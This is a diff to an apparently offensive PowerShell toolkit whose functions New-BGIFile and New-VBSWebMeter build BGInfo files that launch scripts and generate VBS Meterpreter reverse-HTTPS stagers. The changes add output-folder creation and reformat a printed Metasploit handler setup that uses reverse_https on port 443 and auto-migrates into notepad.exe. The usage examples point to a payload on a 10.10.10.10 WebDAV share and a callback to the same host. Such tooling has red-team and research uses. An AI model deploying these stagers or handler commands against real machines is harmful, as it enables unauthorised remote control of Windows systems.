@@ -68,7 +68,6 @@
         $Script,
 
         [Parameter()]
-        [ValidateScript({ Test-Path $_ })]
         [String]
         $OutFilePath = $PWD
     )
@@ -107,6 +106,12 @@
         $OutFile += $Part3
         $OutFile += $Part4
         $OutFile += $Part5
+
+        #Create outfile folder if it is missing
+        if(!(test-path $OutFilePath))
+        {
+            New-Item -path $OutFilePath -type Directory
+        }
 
         #Write the $Outfile
         [System.IO.File]::WriteAllBytes("$OutFilePath\$FileName", $OutFile)
@@ -157,7 +162,6 @@ function New-VBSWebMeter
         $HTTPS,
 
         [Parameter()]
-        [ValidateScript({ Test-Path $_ })]
         [String]
         $OutFilePath = $PWD,
 
@@ -412,18 +416,23 @@ function New-VBSWebMeter
         End If
 "@
 
+    #Verify and create outfilepath if it is missing
+    if(!(test-path $OutFilePath))
+    {
+        New-Item -path $OutFilePath -type Directory
+    }
         
-Write-Output "Remember to start your handler on metasploit
-msfconsole
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_https
-set LHOST 0.0.0.0
-set LPORT 443
-set AutoRunScript post/windows/manage/migrate NAME=notepad.exe
-set EnableUnicodeEncoding true
-set EnableStageEncoding true
-set ExitOnSession false
-exploit -j"
+    Write-Output "Remember to start your handler on metasploit
+    msfconsole
+    use exploit/multi/handler
+    set PAYLOAD windows/meterpreter/reverse_https
+    set LHOST 0.0.0.0
+    set LPORT 443
+    set AutoRunScript post/windows/manage/migrate NAME=notepad.exe
+    set EnableUnicodeEncoding true
+    set EnableStageEncoding true
+    set ExitOnSession false
+    exploit -j"
 
     $Code | Out-File "$OutFilepath\$OutFile" -Encoding ascii
     }
@@ -432,12 +441,6 @@ exploit -j"
     }
 }
 
-
-# Example 1
-New-BGIFile -FileName "StartCMD.bgi" -Script "StartCMD.vbs" -OutFilePath "C:\BGIPayload"
-
-# Example 2
-New-BGIFile -FileName "MyPayload.bgi" -Script "\\10.10.10.10\webdav\VBSMeterShell.vbs" -OutFilePath "C:\BGIPayload"
-
-# Example 3
-New-VBSWebMeter -RHOST "10.10.10.10" -RPORT "443" -HTTPS "Yes" -OutFilePath "C:\BGIPayload" -OutFile "VBSMeterShell.vbs"
+## Example ##
+# New-BGIFile -FileName "MyEvilBgi.bgi" -Script "\\10.10.10.10\webdav\VBSMeterShell.vbs" -OutFilePath "C:\BGIPayload"
+# New-VBSWebMeter -RHOST "10.10.10.10" -RPORT "443" -HTTPS "Yes" -OutFilePath "C:\BGIPayload" -OutFile "VBSMeterShell.vbs"
